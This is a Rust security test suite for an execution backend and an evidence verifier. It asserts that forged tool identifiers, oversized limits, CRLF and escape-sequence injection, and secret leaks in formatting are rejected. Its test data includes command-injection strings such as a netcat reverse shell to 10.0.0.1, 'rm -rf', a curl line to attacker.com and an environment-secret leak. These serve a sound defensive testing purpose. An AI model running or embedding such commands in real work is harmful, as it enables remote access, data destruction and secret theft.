//! Independent adversarial and regression security tests for Increment 5.5.
//!
//! Verification-only test suite probing boundary security, synthetic isolation,
//! timeout/cancellation semantics, evidence validation bounds, and cross-increment invariants.

use std::sync::Arc;

use sentra_core::{
    BackendCapabilities, CostUsd, EvidenceEnvelope, EvidenceId, EvidenceMetadata,
    EvidenceVerificationError, EvidenceVerificationErrorKind, EvidenceVerifier, ExecutionBackend,
    ExecutionEngine, ExecutionError, ExecutionErrorKind, ExecutionId, ExecutionRequest,
    ExecutionResult, ExecutionScope, ExecutionStatus, MAX_EVIDENCE_SIZE_BYTES, OperationAction,
    ResourceLimits, ResourceUsage, SecurityClassification, SessionId, SyntheticFixtureBackend,
    TaskId, TimestampUtc,
};

fn sample_exec_request(scope: ExecutionScope, action: OperationAction) -> ExecutionRequest {
    ExecutionRequest {
        execution_id: ExecutionId::for_test_sequence(1001),
        session_id: SessionId::for_test_sequence(2001),
        task_id: TaskId::for_test_sequence(3001),
        scope,
        action,
        target_revision: "commit-4b825dc642cb6eb9a060e54bf8d69288fbee4904".to_string(),
        resource_limits: ResourceLimits::default(),
        classification: SecurityClassification::Internal,
        created_at: TimestampUtc::now(),
    }
}

fn sample_evidence_meta(payload_len: u64, declared_sha: Option<&str>) -> EvidenceMetadata {
    EvidenceMetadata {
        evidence_id: EvidenceId::for_test_sequence(5001),
        session_id: SessionId::for_test_sequence(2001),
        task_id: TaskId::for_test_sequence(3001),
        producer_role: "adversarial-tester".to_string(),
        media_type: "application/json".to_string(),
        payload_length_bytes: payload_len,
        declared_sha256: declared_sha.map(|s| s.to_string()),
        classification: SecurityClassification::Confidential,
        created_at: TimestampUtc::now(),
    }
}

// -----------------------------------------------------------------------------
// 1. Synthetic Fixture Isolation & Adversarial Action Names
// -----------------------------------------------------------------------------

#[test]
fn adversarial_forged_synthetic_fixture_identifiers_rejected() {
    let backend = SyntheticFixtureBackend::new();

    let malicious_identifiers = [
        "synthetic:noop; rm -rf /",
        "synthetic:noop && whoami",
        "synthetic:noop\0injected",
        "synthetic:noop\ncurl http://attacker.com",
        "SYNTHETIC:NOOP",
        "synthetic:noop ",
        " synthetic:noop",
        "../synthetic:noop",
        "synthetic:",
        "synthetic:sh",
        "synthetic:bash",
        "synthetic:exec",
        "synthetic:spawn",
        "synthetic:eval",
        "synthetic:cmd.exe",
    ];

    for ident in malicious_identifiers {
        let req = sample_exec_request(
            ExecutionScope::SyntheticFixture,
            OperationAction::ExecuteTool {
                tool_id: ident.to_string(),
                untrusted: false,
                arguments: vec!["--arg".to_string()],
            },
        );

        let err = backend.execute(&req).unwrap_err();
        assert_eq!(
            err.kind,
            ExecutionErrorKind::InvalidRequest,
            "Adversarial synthetic identifier '{ident}' was NOT rejected with InvalidRequest!"
        );
        assert!(err.message.contains("Unsupported synthetic fixture action"));
    }
}

#[test]
fn adversarial_scope_and_action_inconsistencies() {
    let backend = SyntheticFixtureBackend::new();

    // Case 1: UntrustedTargetWorkload claiming to run "synthetic:noop" MUST fail closed
    let req_untrusted_fixture = sample_exec_request(
        ExecutionScope::UntrustedTargetWorkload,
        OperationAction::ExecuteTool {
            tool_id: "synthetic:noop".to_string(),
            untrusted: true,
            arguments: vec![],
        },
    );
    let err = backend.execute(&req_untrusted_fixture).unwrap_err();
    assert_eq!(err.kind, ExecutionErrorKind::BackendUnavailable);
    assert!(err.is_unavailable());

    // Case 2: SyntheticFixture scope with ReadWorkspaceFile action MUST be rejected by synthetic backend
    let req_read_file = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::DiscoverMetadata {
            relative_path: "src/main.rs".to_string(),
        },
    );
    let err_action = backend.execute(&req_read_file).unwrap_err();
    assert_eq!(err_action.kind, ExecutionErrorKind::InvalidRequest);

    // Case 3: SyntheticFixture scope with ModifyCheckout action MUST be rejected
    let req_modify = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::ModifyCheckout {
            file_count: 1,
            target_paths: vec!["src/lib.rs".to_string()],
        },
    );
    let err_modify = backend.execute(&req_modify).unwrap_err();
    assert_eq!(err_modify.kind, ExecutionErrorKind::InvalidRequest);
}

#[test]
fn adversarial_arbitrary_arguments_ignored_by_synthetic_backend() {
    let backend = SyntheticFixtureBackend::new();

    // Even if adversarial arguments resembling shell injections are passed,
    // the backend must not execute any process and should safely complete the fixture.
    let req = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::ExecuteTool {
            tool_id: "synthetic:noop".to_string(),
            untrusted: false,
            arguments: vec![
                "| nc -e /bin/sh 10.0.0.1 4444".to_string(),
                "`rm -rf *`".to_string(),
                "$(reboot)".to_string(),
                "--leak-env=$SECRET_KEY".to_string(),
            ],
        },
    );

    let res = backend.execute(&req).unwrap();
    assert_eq!(res.status, ExecutionStatus::Completed);
    assert_eq!(res.exit_code, Some(0));
    assert_eq!(res.resource_usage.output_bytes, 0);
}

// -----------------------------------------------------------------------------
// 2. Resource Limit and Metadata Bounds
// -----------------------------------------------------------------------------

#[test]
fn adversarial_oversized_resource_limits_and_revision_tampering() {
    let mut req = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::ExecuteTool {
            tool_id: "synthetic:noop".to_string(),
            untrusted: false,
            arguments: vec![],
        },
    );

    // U64 overflow / boundary ceiling checks
    req.resource_limits.timeout_millis = u64::MAX;
    assert_eq!(
        req.validate().unwrap_err().kind,
        ExecutionErrorKind::InvalidRequest
    );

    req.resource_limits.timeout_millis = 60_000;
    req.resource_limits.max_memory_bytes = u64::MAX;
    assert_eq!(
        req.validate().unwrap_err().kind,
        ExecutionErrorKind::InvalidRequest
    );

    req.resource_limits.max_memory_bytes = 512 * 1024 * 1024;
    req.resource_limits.max_output_bytes = u64::MAX;
    assert_eq!(
        req.validate().unwrap_err().kind,
        ExecutionErrorKind::InvalidRequest
    );

    // Revision tampering with terminal escape sequences
    req.resource_limits = ResourceLimits::default();
    req.target_revision = "rev\x1b[31mRED".to_string();
    assert_eq!(
        req.validate().unwrap_err().kind,
        ExecutionErrorKind::InvalidRequest
    );

    // Revision with NUL byte
    req.target_revision = "rev\0hidden".to_string();
    assert_eq!(
        req.validate().unwrap_err().kind,
        ExecutionErrorKind::InvalidRequest
    );
}

// -----------------------------------------------------------------------------
// 3. Execution Engine Post-Execution Invariant Verification
// -----------------------------------------------------------------------------

/// Mock backend simulating a contradictory / buggy backend.
struct ContradictoryMockBackend;

impl ExecutionBackend for ContradictoryMockBackend {
    fn name(&self) -> &'static str {
        "contradictory-mock"
    }

    fn capabilities(&self) -> BackendCapabilities {
        BackendCapabilities {
            backend_name: self.name(),
            supports_untrusted: false,
            supports_synthetic: true,
            isolated_vm_available: false,
            host_execution: false,
            docker_wsl_execution: false,
            description: "Mock backend that emits conflicting status codes for audit testing",
        }
    }

    fn execute(&self, request: &ExecutionRequest) -> Result<ExecutionResult, ExecutionError> {
        // Returns a TimedOut status with an exit code of 0
        Ok(ExecutionResult {
            execution_id: request.execution_id,
            status: ExecutionStatus::TimedOut,
            exit_code: Some(0), // Contradiction: timed out but exit code 0
            resource_usage: ResourceUsage::zero(),
            evidence_descriptors: Vec::new(),
            completed_at: TimestampUtc::now(),
        })
    }
}

#[test]
fn execution_engine_handles_contradictory_mock_backend() {
    let engine = ExecutionEngine::new(Arc::new(ContradictoryMockBackend));
    let req = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::ExecuteTool {
            tool_id: "synthetic:noop".to_string(),
            untrusted: false,
            arguments: vec![],
        },
    );

    // Remediates F-551-01: Contradictory result (TimedOut with exit_code Some(0)) MUST produce typed BackendFault
    let err = engine.dispatch(&req).unwrap_err();
    assert_eq!(err.kind, ExecutionErrorKind::BackendFault);
    assert!(err.is_backend_fault());
    assert!(
        err.message.contains(
            "Contradictory execution result: status is TimedOut but exit_code is Some(0)"
        )
    );
}

/// Mock backend returning an ExecutionResult with a mismatched execution_id.
struct MismatchedCorrelationMockBackend;

impl ExecutionBackend for MismatchedCorrelationMockBackend {
    fn name(&self) -> &'static str {
        "mismatched-correlation-mock"
    }

    fn capabilities(&self) -> BackendCapabilities {
        BackendCapabilities {
            backend_name: self.name(),
            supports_untrusted: false,
            supports_synthetic: true,
            isolated_vm_available: false,
            host_execution: false,
            docker_wsl_execution: false,
            description: "Mock backend that emits mismatched execution IDs",
        }
    }

    fn execute(&self, _request: &ExecutionRequest) -> Result<ExecutionResult, ExecutionError> {
        Ok(ExecutionResult {
            // Deliberately returns a forged / different execution ID
            execution_id: ExecutionId::for_test_sequence(99999),
            status: ExecutionStatus::Completed,
            exit_code: Some(0),
            resource_usage: ResourceUsage::zero(),
            evidence_descriptors: Vec::new(),
            completed_at: TimestampUtc::now(),
        })
    }
}

#[test]
fn execution_engine_detects_and_rejects_correlation_mismatch() {
    let engine = ExecutionEngine::new(Arc::new(MismatchedCorrelationMockBackend));
    let req = sample_exec_request(
        ExecutionScope::SyntheticFixture,
        OperationAction::ExecuteTool {
            tool_id: "synthetic:noop".to_string(),
            untrusted: false,
            arguments: vec![],
        },
    );

    // Remediates F-551-05: Mismatched execution_id MUST produce typed CorrelationMismatch error
    let err = engine.dispatch(&req).unwrap_err();
    assert_eq!(err.kind, ExecutionErrorKind::CorrelationMismatch);
    assert!(err.is_correlation_mismatch());
    assert!(err.message.contains("Execution ID correlation mismatch"));
}

// -----------------------------------------------------------------------------
// 4. Evidence Verifier Bounds & Invariants
// -----------------------------------------------------------------------------

#[test]
fn adversarial_evidence_payload_exceeding_ceiling_by_one_byte() {
    assert_eq!(MAX_EVIDENCE_SIZE_BYTES, 52_428_800);

    // Custom verifier with small ceiling to test exact boundary arithmetic without allocating 50 MiB in test
    let test_verifier = EvidenceVerifier::new().with_max_size(100);
    let test_envelope = EvidenceEnvelope::new(sample_evidence_meta(101, None), vec![0x41; 101]);

    let err = test_verifier
        .verify_structural_bounds(&test_envelope)
        .unwrap_err();
    assert_eq!(err.kind, EvidenceVerificationErrorKind::OversizedPayload);
    assert!(err.message.contains("exceeds ceiling"));
}

#[test]
fn adversarial_syntactically_valid_sha256_never_bypasses_offline_gate() {
    let verifier = EvidenceVerifier::new();
    assert!(!verifier.is_crypto_available());

    let payload = b"admitted finding payload".to_vec();
    // Valid 64-char hex string (fake digest)
    let valid_hex_digest = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    let meta = sample_evidence_meta(payload.len() as u64, Some(valid_hex_digest));
    let envelope = EvidenceEnvelope::new(meta, payload);

    // MUST fail closed: syntactically valid SHA-256 cannot be verified offline
    let err = verifier.verify_envelope(&envelope).unwrap_err();
    assert_eq!(
        err.kind,
        EvidenceVerificationErrorKind::CryptographicVerificationUnavailable
    );

    let err_transit = verifier.verify_transit_integrity(&envelope).unwrap_err();
    assert_eq!(
        err_transit.kind,
        EvidenceVerificationErrorKind::CryptographicVerificationUnavailable
    );
}

#[test]
fn adversarial_mime_type_syntax_and_parameter_handling() {
    let mut meta = sample_evidence_meta(10, None);

    // 1. Injected headers / CRLF
    meta.media_type = "application/json\r\nX-Injected: true".to_string();
    assert_eq!(
        meta.validate().unwrap_err().kind,
        EvidenceVerificationErrorKind::InvalidMediaType
    );

    // 2. Whitespace with parameter
    meta.media_type = "application/json; charset=utf-8".to_string();
    assert_eq!(
        meta.validate().unwrap_err().kind,
        EvidenceVerificationErrorKind::InvalidMediaType
    );

    // 3. Trailing spaces (Finding F-551-04 observation)
    meta.media_type = "  application/json  ".to_string();
    // trim() passes validation
    assert!(meta.validate().is_ok());

    // But whitelist matching with exact string fails because metadata was not trimmed in place
    let whitelist_verifier =
        EvidenceVerifier::new().with_allowed_media_types(vec!["application/json".to_string()]);
    let envelope = EvidenceEnvelope::new(meta, vec![0x30; 10]);
    let err = whitelist_verifier
        .verify_structural_bounds(&envelope)
        .unwrap_err();
    assert_eq!(err.kind, EvidenceVerificationErrorKind::InvalidMediaType);
    assert!(err.message.contains("not in the allowed policy whitelist"));
}

#[test]
fn adversarial_sensitive_data_not_leaked_in_any_formatting() {
    let secret = "SECRET_PAT_TOKEN_GITHUB_ghp_1234567890abcdef";
    let payload = secret.as_bytes().to_vec();
    let meta = sample_evidence_meta(payload.len() as u64, None);
    let envelope = EvidenceEnvelope::new(meta, payload);

    // Debug formatting
    let debug_out = format!("{envelope:?}");
    assert!(!debug_out.contains(secret));
    assert!(debug_out.contains("[REDACTED]"));

    // Execution Error formatting
    let exec_err = ExecutionError::new(ExecutionErrorKind::BackendFault, "redacted message");
    let exec_debug = format!("{exec_err:?}");
    let exec_display = format!("{exec_err}");
    assert!(!exec_debug.contains(secret));
    assert!(!exec_display.contains(secret));

    // Evidence Verification Error formatting
    let ev_err = EvidenceVerificationError::new(
        EvidenceVerificationErrorKind::LengthMismatch,
        "safe diagnostic",
    );
    let ev_debug = format!("{ev_err:?}");
    let ev_display = format!("{ev_err}");
    assert!(!ev_debug.contains(secret));
    assert!(!ev_display.contains(secret));
}

// -----------------------------------------------------------------------------
// 5. Cross-Increment Invariant Integration: Uncertain Outcomes & Budget Holding
// -----------------------------------------------------------------------------

#[test]
fn cross_increment_uncertain_execution_retains_conservative_budget_hold() {
    use sentra_core::persistence::SettlementStatus;

    let initial_reservation = CostUsd::from_micro_usd(10_000_000); // $10.00

    // When an execution outcome is TimedOut or Cancelled without clean termination:
    let cancelled_uncertain = SettlementStatus::CancelledUncertain;
    assert!(cancelled_uncertain.is_cancelled());
    assert!(cancelled_uncertain.is_terminal());
    // actual_cost() is None, meaning NO unconsumed budget is released
    assert_eq!(cancelled_uncertain.actual_cost(), None);

    // When an execution outcome is partially completed with uncertain progress:
    let partial_uncertain = SettlementStatus::UncertainPartial;
    assert!(!partial_uncertain.is_cancelled());
    assert!(!partial_uncertain.is_terminal());
    assert_eq!(partial_uncertain.actual_cost(), None);

    // Confirmed completion properly records actual cost
    let confirmed_completed = SettlementStatus::Completed(CostUsd::from_micro_usd(2_500_000));
    assert_eq!(
        confirmed_completed.actual_cost(),
        Some(CostUsd::from_micro_usd(2_500_000))
    );
    assert!(
        confirmed_completed.actual_cost().unwrap().as_micro_usd()
            < initial_reservation.as_micro_usd()
    );
}
